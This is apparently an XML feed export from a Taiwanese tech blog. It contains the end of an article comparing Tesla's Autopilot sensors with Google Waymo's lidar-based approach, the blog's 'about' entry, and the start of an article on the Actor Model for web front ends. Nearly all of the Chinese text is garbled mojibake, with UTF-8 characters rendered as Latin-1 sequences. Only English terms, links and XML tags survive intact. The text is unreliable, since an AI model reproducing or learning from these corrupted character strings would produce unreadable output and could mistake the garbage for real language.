Tesla çš„è»Šé ­è£è‘— Radarï¼Œå¯ä»¥é‡æ¸¬å‰è»Šçš„ä½ç½®å’Œé€Ÿåº¦ï¼Œåœ¨å®šé€Ÿå·¡èˆªæ™‚å¯ä»¥é¿å…æ’åˆ°å‰è»Šï¼›æ“‹é¢¨ç»ç’ƒä¸Šè£è‘— Cameraï¼Œå¯ä»¥åšè¨±å¤šé›»è…¦è¦–è¦ºè™•ç†ï¼Œåƒæ˜¯è¾¨è­˜è¡Œäººã€äº¤é€šè™ŸèªŒã€ç‰©é«”è·é›¢ã€é“è·¯ç™½ç·šï¼Œæ­¤æ¬¾ Camera åœ¨ Hardware-1 æ¶æ§‹ä¸‹æ˜¯è²· Mobileye ä½œç‚º Solutionï¼ˆ 2016 å¹´åº•å¾Œçš„ Hardware-2 æ¶æ§‹å‰‡æ˜¯è·Ÿ Nvidia åˆä½œ ï¼‰ï¼›12 å€‹è¶…è²æ³¢çš„ Sensors å‡å‹»çš„è£åœ¨æ±½è»Šåº•éƒ¨ï¼Œé‡æ¸¬ç¯„åœå¤§æ¦‚ 5 å…¬å°ºï¼Œä¸»è¦æ˜¯ç‚ºäº†é˜²æ’ï¼Œé‚„æœ‰åµæ¸¬ç›²é»å’Œåœè»Šä½ã€‚
ä¾†çœ‹ä¸€ä¸‹ Tesla å®˜æ–¹é‡‹å‡ºçš„ Demo å½±ç‰‡å§ï¼


å½±ç‰‡å¹¾å€‹é‡é»å¦‚ä¸‹ï¼š

æ“ä½œæ¡¿å£“å…©ä¸‹å°±é–‹å•Ÿ Autosteer å®šé€Ÿå·¡èˆª
å·¡èˆªæ™‚æœƒè·Ÿè‘—è»Šé“è½‰å½ï¼Œä¸æœƒåç§»è»Šé“
æƒ³è¦æ›è»Šé“çš„è©±æ‰“å€‹æ–¹å‘ç‡ˆå°±å¥½ï¼ŒTesla å°±æœƒè‡ªå‹•æ›é“
è¶…è²æ³¢æœƒåµæ¸¬åœè»Šç©ºé–“ï¼ŒæŒ‰ä¸‹æŒ‰éˆ•å¾Œå°±æœƒè‡ªå‹•åœè»Š

Google Waymo - Level 4~5ä»‹ç´¹å®Œ Tesla å¾Œï¼Œå†ä¾†ä»‹ç´¹ä¸€ä¸‹ç›®æ¨™æœ€é å¤§ï¼Œæƒ³åšå…¨è‡ªå‹•é§•é§›è»Šçš„ Googleã€‚å…¶è‡ªé§•è»Šåç¨±ç‚º Waymoï¼Œå›  Google æ—¥å‰å°‡è‡ªé§•è»Šéƒ¨é–€æ‹†åˆ†å‡ºä¾†æˆç«‹äº†ç¨ç«‹å…¬å¸ã€‚
æƒ³åšåˆ°é€™é¡å‹çš„è‡ªé§•è»Šï¼Œä¸»è¦éœ€è¦ä»¥ä¸‹åŠŸèƒ½ï¼š

**è¶…ç²¾ç´°çš„ Map ** - åªæœ‰ç¾ä»Š Google Map çš„è³‡è¨Šå°æ–¼å…¨è‡ªå‹•é§•é§›è»Šæ˜¯å®Œå…¨ä¸å¤ çš„ï¼Œåœ°åœ–å¿…é ˆç²¾ç´°åˆ°æ¸…æ¥šå¸‚å€ä¸Šçš„é“è·¯ã€åå­—è·¯å£ã€æ–‘é¦¬ç·šæœ‰å¤šå¯¬ï¼Œé‚„è¦çŸ¥é“ç´…ç¶ ç‡ˆã€äº¤é€šè™ŸèªŒã€äººè¡Œé“ã€æ¶ˆé˜²æ “åœ¨å“ªï¼Œä»¥åŠä»–å€‘çš„é«˜åº¦ç­‰ç­‰ã€‚

![Detailed Map](/img/mymykuo/detailed-map.png)ï¼ˆ Photo Credit: [Google][38] ï¼‰


ç²¾æº–çš„å®šä½ç³»çµ± - æœ‰äº†ç²¾ç´°çš„åœ°åœ–ï¼Œé‚„å¿…é ˆæ­é…ç²¾æº–çš„å®šä½ç³»çµ±ï¼Œæ‰èƒ½è®“è‡ªé§•è»Šç„¡èª¤å·®åœ°è¡Œé§›åœ¨ä¸€èˆ¬é“è·¯ä¸Šã€‚å¦å¤–å› ç‚º GPS æœ‰èª¤å·®ï¼Œç„¡æ³•ç¢ºåˆ‡çš„çŸ¥é“è»Šå­ç¾åœ¨åœ¨å“ªå€‹ç·šé“ï¼Œæ­¤ç²¾æº–å®šä½ç³»çµ±å¿…é ˆæ­é…å…¶å®ƒ Sensor å¹«å¿™ã€‚

ç‰©é«”åµæ¸¬å’Œè¾¨è­˜ - ä¸€èˆ¬é“è·¯ä¸Šç›¸å°æ–¼é«˜é€Ÿå…¬è·¯æœƒç¢°åˆ°æ›´å¤šçš„éšœç¤™ç‰©ï¼Œåƒæ˜¯è¡Œäººã€æ©Ÿè»Šã€æ±½è»Šã€è…³è¸è»Šï¼Œé‚„æœ‰å‹•ç‰©ï¼Œé‚„è¦çŸ¥é“ä»€éº¼æ™‚å€™ç´…ç‡ˆï¼Œä»€éº¼æ™‚å€™ç¶ ç‡ˆç­‰ç­‰ï¼Œé€™äº›éƒ½éœ€è¦ç‰©é«”åµæ¸¬å’Œè¾¨è­˜çš„åŠŸèƒ½ã€‚

è·¯å¾‘è¦åŠƒ - å–®å–®åªæœ‰è®“è»Šå­ç¶­æŒåœ¨ç™½ç·šå…§æ˜¯å®Œå…¨ä¸å¤ ç”¨çš„ï¼Œä¾‹å¦‚é‡åˆ°å‘æ´ã€è·¯éšœã€é“è·¯æ–½å·¥çš„æ™‚å€™è¦ç¹é–‹ï¼Œæˆ–æ˜¯ææ—©é–ƒé¿è¦é–‹é–€çš„æ±½è»Šã€‚


å†ä¾†çœ‹ä¸€ä¸‹å¯¦ç¾é€™äº›åŠŸèƒ½ Waymo éœ€è¦è£å“ªäº› Sensor å§ï¼
![Waymo Sensors Architecture](/img/mymykuo/waymo-sensors-architecture.jpg)ï¼ˆ Photo Credit: [WIRED][39] ï¼‰


Lidar - Waymo è·Ÿ Tesla æœ€ä¸»è¦çš„å·®åˆ¥æ˜¯åœ¨æ–¼ Waymo è»Šé ‚è£äº† Lidarã€‚é™¤äº†å¯ä»¥å¹«å¿™å»ºè¶…ç²¾ç´°çš„ 3D Map  å¤–ï¼Œé‚„å¯ä»¥æ„Ÿæ‡‰åˆ°æ–¹åœ“ 100 å…¬å°ºå…§ç‰©é«”çš„æ–¹ä½ã€è§’åº¦ã€è·é›¢ã€‚

Video Cameras - å› ç‚ºæœ‰è¶…ç²¾ç´°çš„ 3D Mapï¼Œæ‰€ä»¥ Camera ä¸å¤ªéœ€è¦åµæ¸¬é“è·¯ç™½ç·šï¼Œä¸»è¦ç”¨ä¾†è¾¨è­˜ç´…ç¶ ç‡ˆå’Œè¼”åŠ©å…¶å®ƒ Lidar åšä¸åˆ°çš„äº‹ã€‚

Radar Sensors - åµæ¸¬éšœç¤™ç‰©ä»¥åŠé¿å…ç¢°æ’ã€‚

Central Computer - åˆ†ææ‰€æœ‰ Sensors å‚³éä¾†çš„ Inputï¼Œè¦åŠƒå‡ºè¦èµ°çš„è·¯å¾‘å’Œæ±ºå®šè‡ªé§•è»Šæ–¹å‘ç›¤è½‰å‘ã€åŠ æ¸›é€Ÿã€‚

Odometry Sensors - è¼”åŠ© GPS çš„å´è· Sensorsï¼Œè®“æ±½è»Šèƒ½æ›´ç²¾æº–çš„å®šä½åœ¨è¶…ç²¾ç´°çš„ 3D Map ä¸Š

Ultrasonic Sensors - ç›²é»åµæ¸¬ä»¥åŠåœè»Šä½åµæ¸¬ã€‚

GPS - çµåˆè½‰é€Ÿè¨ˆã€æ¸¬é«˜å„€ã€è¿´è½‰å„€çš„è³‡è¨Šä¾†æä¾›æ›´ç²¾æº–çš„å®šä½ã€‚


é€™äº› Sensor ä¸­ï¼Œæœ€è²´çš„å°±æ˜¯è»Šé ‚ä¸Šçš„ Lidarï¼Œæœ€è²´å¯ä»¥åˆ° 8000 ç¾é‡‘ï¼ˆ ~&#x3D; 4856ä»½ç‡Ÿé¤Šåˆé¤ ï¼‰ã€‚
å¤§å®¶ç›®å‰æ¯”è¼ƒæœ‰å°è±¡çš„æ‡‰è©²æ˜¯ä¸‹é¢é€™å°åŸå‹è»Šï¼Œè»Šä¸Šè£çš„ Sensor è·Ÿä¸Šä¸€å¼µåœ–å·®ä¸å¤šï¼Œä¸»è¦çš„å·®åˆ¥æ˜¯åŸå‹è»Šä¸Šæ²’æœ‰æ–¹å‘ç›¤ï¼Œå› ç‚ºç›®æ¨™æ˜¯å¯¦ç¾ Level 5 çš„å…¨è‡ªå‹•é§•é§›è»Šã€‚
![Waymo Prototype](/img/mymykuo/waymo-prototype.jpg)ï¼ˆ Photo Credit: [Waymo][40] ï¼‰

ä¸€æ¨£ä¾†çœ‹ä¸€ä¸‹ Waymo å®˜æ–¹é‡‹å‡ºçš„ Demo å½±ç‰‡å§ï¼


å½±ç‰‡å¹¾å€‹é‡é»å¦‚ä¸‹ï¼š

é»‘ç™½ä¸å‹•çš„éƒ¨åˆ†å°±æ˜¯è¶…ç²¾ç´°çš„ Mapï¼Œç´«è‰²å°±æ˜¯é€é Lidar åµæ¸¬åˆ°çš„ç‰©é«”
è¾¨è­˜åˆ°è·¯éšœæ™‚é€²è¡Œé“è·¯è¦åŠƒç„¶å¾Œé–ƒé¿å®ƒ
é‡æ¸¬åˆ°è·¯é‚Šéšœç¤™ç‰©æ™‚é€²è¡Œé“è·¯è¦åŠƒç„¶å¾Œé–ƒé¿å®ƒ
è¾¨è­˜åˆ°éµè·¯æŸµæ¬„æ™‚ï¼Œå°å¿ƒç¿¼ç¿¼åœ°ç­‰å‰ä¸€å°è»Šé›¢é–‹å¾Œæ‰ç¹¼çºŒé–‹
è¾¨è­˜åˆ°è…³è¸è»Šå’Œä»–çš„æ‰‹å‹¢æ™‚ï¼Œèª¿æ•´è»Šé€Ÿä¸¦æ”¹è®Šæ–¹å‘

Tesla vs Googleæœ€å¾Œæˆ‘å€‘ä¾†æ¯”è¼ƒä¸€ä¸‹æ­è¼‰ Hardware-1 çš„ Tesla å’Œ Google Waymoã€‚å› ç‚ºä¸»è¦æ„ŸçŸ¥ç’°å¢ƒçš„æ–¹æ³•ä¸åŒï¼Œå¤§å®¶ä¹ŸæŠŠå®ƒçœ‹ä½œæ˜¯ Camera å’Œ Lidar çš„è¼¸è´ã€‚
![Tesla vs Google](/img/mymykuo/tesla-vs-google.png)


è‡ªé§•ç­‰ç´š - è‡ªé§•ç­‰ç´šåˆ†åˆ¥æ˜¯ 23 å’Œ 45ã€‚
è¶…ç²¾ç´° Map - Tesla æ²’æœ‰è¶…ç²¾ç´° Map è€Œ Google Waymo æœ‰ï¼Œæ‰€ä»¥ä¸€å€‹åªèƒ½åœ¨é«˜é€Ÿå…¬è·¯ä½¿ç”¨ï¼Œå¦ä¸€å€‹å·²ç¶“èƒ½åœ¨ä¸€èˆ¬é“è·¯ä¸Šé–‹ã€‚
ä¸»è¦çš„ Sensor - æ„ŸçŸ¥ç’°å¢ƒçš„ Sensor ä¸»è¦æ˜¯ Camera å’Œ Lidarã€‚
Sensor çš„èŠ±è²» -  Lidar ç›®å‰éå¸¸è²´ï¼Œè€Œä¸” Waymo é‚„éœ€è¦é¡å¤–çš„å®šä½ Sensorã€‚
Sensors æ„Ÿæ‡‰åŠå¾‘ - è®“æ±½è»Šå‰å¾Œå·¦å³éƒ½èƒ½æ„ŸçŸ¥ç’°å¢ƒï¼ŒTesla å‰é¢æ˜¯é  Cameraï¼Œä½†å·¦å³å’Œå¾Œé¢æ˜¯é€éè¶…è²æ³¢ï¼ŒåŠå¾‘åªèƒ½åˆ° 5 å…¬å°ºå·¦å³ï¼Œè€Œ Waymo Lidar çš„åŠå¾‘å‰‡èƒ½åˆ° 100 å…¬å°ºå·¦å³ã€‚
Sensor è§£æåº¦ - Camera çš„è§£æåº¦å¾ˆé«˜ï¼Œè€Œ Lidar å‡ºä¾†çš„å½±åƒé›–ç„¶æ˜¯ 3D è³‡è¨Šï¼Œä½†è§£æåº¦å»ä¸é«˜ã€‚
CPU - Camera çš„é«˜è§£æåº¦é€ æˆ Tesla ä¸»æ©Ÿçš„ CPU åœ¨è§£æ Camera å½±åƒæ™‚æœƒéœ€è¦æ›´å¤§çš„é‹ç®—é‡ã€‚

å…‰çœ‹é€™æ¨£å¥½åƒæœƒè¦ºå¾— Google Waymo çš„è§£æ³•é™¤äº† Lidar æ¯”è¼ƒè²´ç„¡æ³•æ¥å—ä»¥å¤–ï¼ˆ æœ€è¿‘ Lidar é‚„é™ä½æˆæœ¬äº†å‘¢ ï¼‰ï¼Œæ ¹æœ¬å¤§å‹ï¼ä½† Google Waymo ç›®å‰é‚„ç„¡æ³•æ¨è¡Œæœ‰ä¸€å€‹å¾ˆå¤§çš„åŸå› ï¼Œå› ç‚ºå»ºç«‹è¶…ç²¾ç´°çš„ 3D Map éå¸¸è€—æ™‚ï¼Œç¶­è­·ä¹Ÿéœ€è¦å¾ˆå¤§çš„æˆæœ¬ã€‚
å¾å‰é¢çš„æ–‡ç« å¤§å®¶æ‡‰è©²å¯ä»¥å¯Ÿè¦ºåˆ°è‡ªé§•è»Šé‹ç”¨ Sensor æ„ŸçŸ¥å‘¨é­ç’°å¢ƒä¸€åˆ‡äº‹ç‰©çš„é‡è¦æ€§ï¼Œè€Œæˆ‘å€‹äººè¦ºå¾— Sensor æƒ³åšçš„äº‹è·Ÿçµäººçš„é«˜ç­‰æ‡‰ç”¨æŠ€ &lt; åœ“ &gt; å¾ˆåƒï¼Œåœ¨åœ“å…§å¯ä»¥æ„ŸçŸ¥ä¸€åˆ‡ç‰©é«”çš„å½¢ç‹€å’Œå‹•ä½œã€‚
![HunterXHunter Circle](/img/mymykuo/hunterXhunter-circle.png)ï¼ˆ Photo Credit: HunterXHunter ~~è¦å¾©åˆŠäº†è€¶è€¶~~ ï¼‰

èˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘èªç‚ºç›®å‰ Hardware-1 çš„ Tesla å°±æ˜¯çµäººè£¡çš„ä¿¡é•·ï¼Œè€Œ Google Waymo å°±æ˜¯å¥‡çŠ½ä»–çˆºçˆºã€‚
![HunterXHunter 4m Tesla](/img/mymykuo/hunterXhunter-4m-tesla.png)
 ![HunterXHunter 100m Google](/img/mymykuo/hunterXhunter-100m-google.png)ï¼ˆ Photo Credit: HunterXHunter ~~ä½†çµå±€é‚„æ˜¯ç‡’çµ¦æˆ‘å—šå—š~~ ï¼‰

[ ç¸½çµ ]é€™ç¯‡æ–‡ç« ä¸»è¦æ˜¯æˆ‘ 2016 å¹´æ™‚çš„è§€å¯Ÿï¼Œæœ‰äº›åœ°æ–¹å¯èƒ½è·Ÿç¾ä»Šè‡ªé§•è»Šçš„ç”¢æ¥­æœ‰äº›å‡ºå…¥ï¼Œä½†ç•¢ç«Ÿé€™ç”¢æ¥­ç¬æ¯è¬è®Šï¼Œä¸åªä¸Šè¿°æåˆ°çš„å¤§å…¬å¸ï¼Œè¨±å¤šæ–°å‰µå°å…¬å¸ï¼ˆ Drive.aiã€Comma.aiã€nuTomomyã€OTTO ï¼‰ä¹Ÿæ¶è‘—æ“ é€²é€™é‚„ç®—è—æµ·çš„ç”¢æ¥­ã€‚
äº”å¹´å¾Œè‡ªé§•è»Š Level 0~5 çš„æ’åæœ‰å¾ˆå¤§çš„æ©Ÿç‡å°±æœƒæ‰“è‡‰æˆ‘ä¸Šé¢æ•´ç†çš„ç­‰ç´šè¡¨ï¼Œä¹Ÿè¨± Mobileye + Intel + BMW æœƒå…ˆå¯¦ç¾å…¨è‡ªå‹•é§•é§›è»Šï¼Œä¹Ÿè¨±æ˜¯ Tesla + Nvidiaï¼Œä¹Ÿè¨±ä¾èˆŠæ˜¯ Google Waymoï¼Œå…¶å®ƒå…¬å¸éƒ½æ˜¯å¿«æ¨‚å¤¥ä¼´ã€‚Who knowsï¼ï¼ˆ æ›¾ç¶“ç²¾æº–é æ¸¬ AMD å¤§æ¼²çš„ obov å€’æ˜¯æœ‰åœ¨ PTT ç•™è¨€é–‹ç¤º ï¼‰å°±ç¹¼çºŒè§€å¯Ÿä¸‹å»å§ï¼
ç¸½ä¹‹å¸Œæœ›è§€å¯Ÿåˆ°é€™ç¯‡æ–‡ç« çš„è®€è€…èƒ½ç•¥æ‡‚ï¼š

Why - ç‚ºä»€éº¼è‡ªé§•è»Šå¾ˆé‡è¦å‘¢ - æ•‘å‘½ã€çœæ™‚ã€è³ºå¤§éŒ¢
What - ä»€éº¼æ˜¯è‡ªé§•è»Š - èƒ½æ„ŸçŸ¥ç’°å¢ƒã€ä¸éœ€äººé¡æ“ä½œã€æœ‰ 0~5 å€‹ç­‰ç´š
How - è‡ªé§•è»Šæ˜¯å¦‚ä½•é‹ä½œçš„ - ç”¨ Sensor åµæ¸¬å’Œè¾¨è­˜ç‰©é«”ã€æ±ºç­–åŠ æ¸›é€Ÿå’Œè½‰å‘

æœ‰æ©Ÿæœƒã€æœ‰æ™‚é–“çš„è©±ä¹‹å¾Œå†èŠèŠï¼š

Deep Learning ç‚ºä»€éº¼åœ¨è‡ªé§•è»Šä¸­æ‰®æ¼”é—œéµè§’è‰²
è‡ªé§•è»Šç”¢æ¥­ç›®å‰å’Œæœªä¾†æœ‰ä»€éº¼é›£é¡Œè¦å…‹æœ
è‡ªé§•è»Šæœªä¾†çš„å•†æ¥­æ¨¡å¼

å°±é€™æ¨£å•¦ï¼Œä»¥ä¸Šåªæ˜¯æˆ‘çš„è§€å¯Ÿå•¦ï¼Œæ°ï¼
é—œæ–¼ä½œè€…ï¼š@mymykuo ä¸€å€‹å˜´è³¤ä½†ä¸­è‚¯ã€ç‘£äº‹è§€å¯Ÿç³»ã€è·³å˜»å“ˆçš„å½é™½å…‰çœŸå®…è»Ÿé«”å·¥ç¨‹å¸«
]]></content>
      <tags>
        <tag>è‡ªé§•è»Š</tag>
        <tag>Self-Driving Car</tag>
        <tag>é„‰æ°‘çœ‹ç§‘æŠ€</tag>
      </tags>
  </entry>
  <entry>
    <title>é—œæ–¼é€™å€‹æŠ€è¡“å…±ç­†éƒ¨è½æ ¼</title>
    <url>/2016/03/19/about/</url>
    <content><![CDATA[TechBridge Weekly æŠ€è¡“é€±åˆŠåœ˜éšŠæ˜¯ä¸€ç¾¤å°ç”¨æŠ€è¡“æ”¹è®Šä¸–ç•Œæ‡·æŠ±ç†±æƒ…çš„åœ˜éšŠã€‚æœ¬æŠ€è¡“å…±ç­†éƒ¨è½æ ¼åˆæœŸå°ˆæ³¨æ–¼Webå‰å¾Œç«¯ã€è¡Œå‹•ç¶²è·¯ã€æ©Ÿå™¨äºº&#x2F;ç‰©è¯ç¶²ã€æ•¸æ“šåˆ†æèˆ‡ç”¢å“è¨­è¨ˆç­‰æ­£é«”ä¸­æ–‡æŠ€è¡“åŸå‰µæ–‡ç« æˆ–åœ‹å¤–å¥½æ–‡ç¿»è­¯åˆ†äº«ã€‚This is TechBridge Weekly Team Tech Blog, which focus on web, mobile, robotics, IoT, data analytics technology sharing.

æŠ€è¡“æ—¥å ±ï¼šhttp://www.techbridge.cc/
æŠ€è¡“é€±åˆŠï¼šhttp://weekly.techbridge.cc/
æŠ€è¡“å…±ç­†éƒ¨è½æ ¼ï¼šhttp://blog.techbridge.cc/
ç²‰çµ²å°ˆé ï¼šhttps://www.facebook.com/techbridge.cc/
é›»å­éƒµä»¶ï¼štechbridge.cc@gmail.com

ç›®å‰è² è²¬çš„ Curator
@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡
@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººè·Ÿé›»è…¦è¦–è¦ºæœ‰å°‘è¨±ç ”ç©¶ï¼Œæœ€è¿‘åœ¨é›éŠè‡ªå·±çš„åŸ·è¡ŒåŠ›

]]></content>
      <tags>
        <tag>IoT</tag>
        <tag>Mobile</tag>
        <tag>Web</tag>
        <tag>Startup</tag>
        <tag>Data</tag>
        <tag>Robotics</tag>
        <tag>Maker</tag>
        <tag>UI/UX</tag>
        <tag>Product</tag>
      </tags>
  </entry>
  <entry>
    <title>46 å¹´è€æŠ€è¡“èˆ‡ Web çš„æ–°ç«èŠ± - Actor Model in Web</title>
    <url>/2019/06/21/actor-model-in-web/</url>
    <content><![CDATA[å‰è¨€åœ¨ä»Šå¹´çš„ Google I&#x2F;O 2019 ä¸­ï¼Œ@Surma, @Jake èˆ‡ @Mariko æ¨å‡ºäº†ä¸€æ¬¾èƒ½åœ¨ä½éšçš„ feature phone ä¸Šé‹ä½œé †æš¢çš„ web app - PROXXï¼Œå…¶ä¸­åˆ©ç”¨åˆ°äº† Web worker ä¾†åˆ†æ“”è¨±å¤š Browser main thread ä¸­çš„å·¥ä½œï¼Œè®“ç•«é¢æ¸²æŸ“å¯ä»¥æ›´é †æš¢ï¼Œä¹Ÿå› æ­¤è®“æˆ‘æ³¨æ„åˆ°å»å¹´åœ¨ Chrome dev summit 2018 ä¸­çš„ä¸€æ”¯å½±ç‰‡ - Architecting Web Apps - Lights, Camera, Action!ï¼Œè®“æˆ‘çœ¼ç›ç‚ºä¹‹ä¸€äº®ï¼Œè£¡é¢è¬›åˆ°ä»–å€‘åˆ©ç”¨ Actor Model ä¾†å°‡é—œæ³¨é»åˆ†é›¢ï¼Œä¸åŒçš„ Actors å„è‡ªè² è²¬ä¸åŒçš„å·¥ä½œï¼Œå½¼æ­¤ä¹‹é–“ç”¨å…±é€šçš„ä»‹é¢æºé€šï¼Œå¦‚æ­¤ä¸€ä¾†ï¼Œé™¤äº†å°‡è¤‡é›œçš„é‹ç®—é‚è¼¯æ”¾å…¥ Web worker å¤–ï¼Œç”±æ–¼æ¶æ§‹ä¸Šçš„ç‰¹æ€§ï¼Œç†è«–ä¸Šä¹Ÿèƒ½å¾ˆæ–¹ä¾¿çš„æŠ½æ› View çš„å¯¦ä½œæ–¹å¼ï¼Œåƒæ˜¯ä¸€å¥— web appï¼Œå¯ä»¥åœ¨ä¸é‡å¯«æ‰€æœ‰é‚è¼¯çš„æƒ…æ³ä¸‹ï¼Œå¾ Vue å¯¦ä½œ viewï¼Œè½‰æ›åˆ°ä»¥ React å¯¦ä½œã€‚
è½èµ·ä¾†éå¸¸åˆç†ï¼Œè€Œæœ‰è¶£çš„æ˜¯ï¼Œé€™å€‹ Actor Model å…¶å¯¦æ—©åœ¨ 46 å¹´å‰å°±è¢«æå‡ºï¼Œä¹Ÿæœ‰æ‡‰ç”¨åœ¨ Web é ˜åŸŸä¸Šéï¼Œåƒæ˜¯ç”¨ Scala æ’°å¯« çš„ Akkaï¼Œæˆ–æ˜¯åœ¨é›»ä¿¡é€šè¨Šä¸Šæœ‰åçš„ Erlangï¼Œä½†æ˜¯åœ¨å‰ç«¯ä¸Šä¼¼ä¹æ˜¯ç¬¬ä¸€æ¬¡è¢«æå‡ºä¾†ã€‚
ä»Šå¤©é€éé€™ç¯‡æ–‡ç« ä¾†äº†è§£ä¸€ä¸‹é€™å€‹ 46 å¹´å‰å°±å­˜åœ¨çš„è§€å¿µæ˜¯ä»€éº¼ï¼Œè€Œåˆèƒ½å¦‚ä½•èˆ‡ Web å‰ç«¯æ•´åˆå‘¢ï¼
Actor Model ä»‹ç´¹Actor Model æ˜¯ä¸€å€‹é—œæ–¼ concurrent computation çš„ conceptual modelï¼Œåœ¨ 1973 å¹´æœ€æ—©è¢«æå‡ºæ™‚ï¼Œåªæ˜¯ä¸€å€‹æ¦‚å¿µæ¨¡å‹ï¼Œç”¨ä¾†æŠ½è±¡åŒ–ä¸¦è¡Œè™•ç†ç¨‹åºçš„è¤‡é›œç¨‹å¼ï¼Œç›´åˆ° 1985 æ‰è¢«å»¶ä¼¸å‡ºä¸€å€‹å®Œæ•´çš„ Actor model theoryï¼Œæœ‰èˆˆè¶£å¯ä»¥åˆ° wiki æŸ¥çœ‹ã€‚
è€Œç‚ºä»€éº¼æœƒéœ€è¦æå‡º Actor Model ä¾†è™•ç† concurrent issue å‘¢ï¼Ÿ
æ­·å²ä¸Šçš„å‰å› å¾Œæœåœ¨é€™å€‹å½±ç‰‡ä¸­çš„å‰åŠæ®µè§£é‡‹å¾—è »æ¸…æ¥šçš„ [COSCUP 2011] Programming for the Future, Introduction to the Actor Model and Akka Framework
å¤§é«”ä¸Šæ˜¯èªªï¼Œç”±æ–¼ CPU çš„è£½ç¨‹æ˜¯æœ‰å…¶æ¥µé™å­˜åœ¨ï¼Œå·²ç¶“ç„¡æ³•ä¿è­‰ Mooreâ€™s Law æœƒæŒçºŒä¸‹å»ï¼Œå–è€Œä»£ä¹‹çš„æ˜¯ç”¨å¤šæ ¸å¿ƒä¾†æé«˜è™•ç†å™¨å…§çš„é›»æ™¶é«”æ•¸é‡ï¼Œé€éå¤šæ ¸å¿ƒçš„ä¸¦è¡Œè™•ç†ä¾†æé«˜é‹ç®—é€Ÿåº¦ï¼Œè€Œå¹³è¡Œè™•ç†å°æ–¼æ’°å¯«ç¨‹å¼çš„æˆ‘å€‘ä¾†èªªï¼Œå°±æ˜¯å¾ˆè¤‡é›œçš„ä¸€å€‹å­˜åœ¨ï¼Œå› ç‚ºæˆ‘å€‘æœ‰ Shared mutable stateï¼Œé€ æˆ race conditionã€dead lock ç­‰ç­‰çš„ issue éœ€è¦é¿å…ï¼Œè€Œ Actor Model å°±æ˜¯å› æ‡‰è€Œç”Ÿçš„è§£æ±ºæ–¹æ¡ˆä¹‹ä¸€ã€‚
Actor Model ä¸»è¦æœ‰å¹¾å€‹ç‰¹é»ï¼š

è¼•é‡ç‰©ä»¶: Actor æ˜¯ç³»çµ±å…§çš„ä¸€å€‹åŸºç¤å–®ä½ï¼Œæ¯å€‹ Actor åªè² è²¬è‡ªå·±çš„å·¥ä½œï¼Œæ‰€ä»¥å¯ä»¥å¾ˆè¼•é‡ã€‚

æ²’æœ‰ shared stateï¼šæ¯å€‹ Actor å„è‡ªç®¡ç†è‡ªå·±çš„ stateï¼Œè·‘åœ¨å„è‡ªçš„ thread ä¸Šï¼Œä¸å…±äº« memory èˆ‡ stateã€‚

é€é message æºé€šï¼šæ¯å€‹ Actor æœƒæœ‰ä¸€å€‹ message queueï¼Œæˆ–ç¨±ä½œ mailboxï¼Œæ¥æ”¶åˆ°çš„è¨Šæ¯æœƒåœ¨æ­¤æ’éšŠç­‰è‘—ä¾åºåŸ·è¡Œã€‚


ä¸€å€‹ Actor çš„æ¶æ§‹ç•¥å¦‚ä¸‹åœ–ï¼š

æ¯å€‹ Actor éƒ½æœ‰è‡ªå·±çš„ private stateï¼Œåˆ¥çš„ Actor æ²’è¾¦æ³•ç›´æ¥æ›´å‹•ä½ çš„ stateï¼Œé™ä½äº†å› ç‚º shared state ç”¢ç”Ÿçš„å•é¡Œã€‚
æˆ‘å€‘æ‹‰é ä¸€é»ä¾†çœ‹ï¼ŒActor é‹è¡Œåœ¨ä¸åŒçš„ Thread ä¸­ï¼Œå½¼æ­¤ä¹‹é–“é€é Message ä¾†æºé€šï¼Œæ”¶åˆ°è¨Šæ¯å¾Œå„è‡ªæ±ºå®šè¦æ¡å–ä»€éº¼æ¨£çš„å°æ‡‰å‹•ä½œï¼Œè€Œæ›´æ”¹çš„éƒ½åªæœƒæ˜¯è‡ªå·±çš„ private stateï¼Œæ²’æœ‰ share memoryï¼Œå½¼æ­¤ä¹‹é–“æ˜¯äº’ç›¸ç¨ç«‹çš„ã€‚

è€Œåœ¨æ“ä½œä¸Šï¼Œæ¯å€‹ Actor åªè¢«å…è¨±åšä¸‹é¢ä¸‰ç¨® operationï¼š

å‰µå»ºå¦ä¸€å€‹ Actor
å‚³é€ Message
æŒ‡ç¤ºè©²å¦‚ä½•è™•ç†ä¸‹ä¸€å€‹ Message

å‰é¢å…©ç¨®å¾ˆå¥½ç†è§£ï¼Œä½†ç¬¬ä¸‰å€‹å°±è »æœ‰è¶£çš„äº†ï¼Œèˆ‰ä¾‹ä¾†èªªï¼Œå‡è¨­æœ‰å€‹ Counter Actor Aï¼Œä¸€ç›´ä»¥ä¾†éƒ½æ˜¯æœƒæŠŠæ¥å—åˆ°çš„ Message æ•¸å­—ç´¯åŠ åˆ°è‡ªå·±çš„ counter state ä¸­ï¼Œä½†ä»Šå¤©å¯ä»¥æœ‰å¦ä¸€å€‹ Actor B å‚³éè¨Šæ¯è·Ÿ Actor A èªªï¼šã€hey, ä½ é€™æ¬¡å…ˆä¸ç”¨ç´¯åŠ æ•¸å­—äº†ï¼Œä½†æ˜¯ä¸‹ä¸€å€‹å‚³é€²ä¾†çš„è¨Šæ¯ï¼Œä½ è¦ä¹˜ä»¥ 2 ä»¥å¾Œå†æ”¾åˆ°è¨ˆæ•¸å™¨å…§å–”ã€ã€‚

é€™å€‹ä¸‰å€‹ç‰¹æ€§åˆå†ä¸€èµ·æ™‚ï¼Œæœ‰å€‹å¾ˆå¤§çš„å¥½è™•ï¼šå®¹éŒ¯ç³»çµ±ã€‚
